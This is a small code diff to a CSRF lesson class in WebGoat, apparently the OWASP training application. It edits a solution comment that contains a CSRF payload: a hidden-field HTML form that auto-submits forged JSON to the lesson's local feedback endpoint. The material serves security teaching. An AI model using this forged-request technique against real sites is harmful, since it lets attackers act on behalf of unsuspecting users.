@@ -117,7 +117,7 @@ public class CSRFFeedback implements AssignmentEndpoint {
 
   // Solution:
   // <form name="attack" enctype="text/plain" action="http://localhost:8080/WebGoat/csrf/feedback/message" METHOD="POST"> 
-  //     <!-- Construct valid JSON data: {name: "HackHuang", email: "hi#hackorg.com", subject: "service", message: "hello world="} -->
+  //     <!-- Construct valid JSON data: {name: "HackHuang", email: "email@example.com", subject: "suggestions", message: "Fixed the invalid solution="} -->
   //     <input type="hidden" name='{"name": "HackHuang", "email": "email@example.com", "subject": "suggestions","message":"Fixed the invalid solution', value='"}'>
   // </form> 
   // <script>document.attack.submit();</script>
